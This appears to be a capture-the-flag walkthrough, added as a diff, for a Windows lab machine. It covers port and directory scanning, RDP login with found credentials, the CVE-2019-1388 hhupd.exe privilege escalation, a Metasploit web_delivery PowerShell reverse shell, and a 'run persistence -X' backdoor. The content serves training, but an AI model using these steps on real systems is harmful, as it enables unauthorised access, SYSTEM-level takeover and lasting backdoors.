@@ -1,0 +1,158 @@
+nmap -r 10.10.3.208
+**********
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 20:23 IST
+Nmap scan report for 10.10.3.208
+Host is up (0.26s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 27.02 seconds
+
+************
+
+
+This directory can be found on the wordlist 'directory-list-2.3-small.txt' 
+which is located in /usr/share/wordlists/dirbuster on a default kali installation
+******************
+gobuster can be used to find hidden directores
+
+*****************
+gobuster dir -u 10.10.3.208 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
+******************
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.3.208
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/29 22:16:00 Starting gobuster
+===============================================================
+[ERROR] 2020/07/29 22:17:37 [!] Get http://10.10.3.208/wife: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:37 [!] Get http://10.10.3.208/Logos: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:37 [!] Get http://10.10.3.208/exit: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:40 [!] Get http://10.10.3.208/resumes: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:40 [!] Get http://10.10.3.208/mar: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:40 [!] Get http://10.10.3.208/gallery2: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2020/07/29 22:17:41 [!] Get http://10.10.3.208/mortgages: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+/retro (Status: 301)
+
+*********************
+directore named /retro is found
+********************
+
+
+after looking the post
+
+username wade
+password parzival
+
+are found 
+
+**********
+
+Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt
+by useing remmina
+************
+
+************
+This task was mainly concerned with privilege escalation and gaining access to system.
+
+#1 Viewing the browsing history identified CVE-2019-1388 as the CVE researched on the system.
+Browsing history
+
+#2 hhupd is the executable required for exploiting CVE-2019-1388. This executable can be identified either by googling the CVE or by viewing file in the recycle bin.
+Googling CVE-2019-1388
+Recycle bin
+
+#3 No answer needed. First we check our current user authority.
+Current user authority
+
+Copy the “hhupd.exe” file from recycle bin to desktop.
+Copy hhupd.exe from recycle bin
+
+Right click “hhupd.exe” and click “Run as Administrator”.
+Administrator password required
+
+As we don’t have the Administrator password, we click “Show information about the publisher’s certificate”.
+Certificate information
+
+Click the “VeriSign Commercial Software Publishers CA”. This opened a browser window.
+VeriSign Page
+
+ Click “File -> Save As” option.
+Save as
+
+Goto “C:\Windows\System32”. In the filename type *.* and press enter. Look for the “Cmd.exe”.
+cmd.xex
+
+Right click “cmd.exe” and select “Run as administrator” option and we have a shell with Administrator privileges as the browser was running with this authority.
+System authority
+
+#4 nt authority\system.
+System authority
+
+#5 Root flag was found by reading contents of file C:\Users\Administrator\Desktop\root.txt.txt.
+
+
+****************
+
+
+by doing all this we have got elavated prevelages
+
+************
+
+
+***********
+metasploit
+***********
+
+ 	
+
+Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, 
+let's go ahead and try a different method of payload delivery! For this, 
+we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 
+'exploit/multi/script/web_delivery' for use.
+************
+sudo msfconsole
+**************
+ use exploit/multi/script/web_delivery
+****************
+
+First, let's set the target to PSH (PowerShell). Which target number is PSH?
+2
+***********
+	found by
+******
+show targets
+***********
+set target 2
+***********
+#3 	After setting your payload, set your lhost and lport
+***********
+
+ 	Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. 
+Do this now with the command: 
+'set payload windows/meterpreter/reverse_http'.
+ Following this, launch the attack as a job with the command 'run -j'.
+
+**************
+ 	Return to the terminal we spawned with our exploit. 
+In this terminal, paste the command output
+ by Metasploit after the job was launched
+run this command in last cmd terminal, 
+return to our attacker machine and note that our reverse shell has spawned.
+***********
+
+and then meterpreter shell will be established
+**************
+run persistence -X
+***************
+it is used to create a backdoor to the system even after the system is rebooted
+ 
